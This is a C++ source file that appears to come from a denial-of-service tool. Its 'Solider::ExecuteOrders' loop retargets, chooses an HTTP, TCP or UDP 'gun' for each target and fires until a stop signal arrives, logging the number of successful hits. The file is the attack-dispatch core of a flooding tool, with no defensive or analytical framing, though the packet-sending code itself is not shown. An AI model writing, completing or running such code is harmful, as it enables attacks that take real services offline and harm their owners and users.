#include "solider.h"

#include "http_gun.h"
#include "tcp_gun.h"
#include "udp_gun.h"

void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &target)
{
	std::size_t hitsCount{0};

	while(!task.ShouldStop())
	{
		if(target.NeedWeaponAim())
		{
			target.Retarget(task);
			if(task.ShouldStop())
			{
				continue;
			}
		}

		Attackers::AttackMethod method = target.GetAttackMethod();
		const CURI coordinates = target.GetCoordinates();

		Attackers::PGun gun;

		switch(method)
		{
			case Attackers::AttackMethod::HTTPAttack:
			{
				gun = std::make_unique<Attackers::HTTPGun>(task);
				break;
			}
			case Attackers::AttackMethod::TCPAttack:
			{
				gun = std::make_unique<Attackers::TCPGun>(task);
				break;
			}
			case Attackers::AttackMethod::UDPAttack:
			default:
			{
				gun = std::make_unique<Attackers::UDPGun>(task);
				break;
			}
		}
		if(gun)
		{
			hitsCount += gun->FireTillDead(coordinates);
		}
	}
	SPDLOG_INFO("Stoping execution with {} succesfull hits", hitsCount);
}
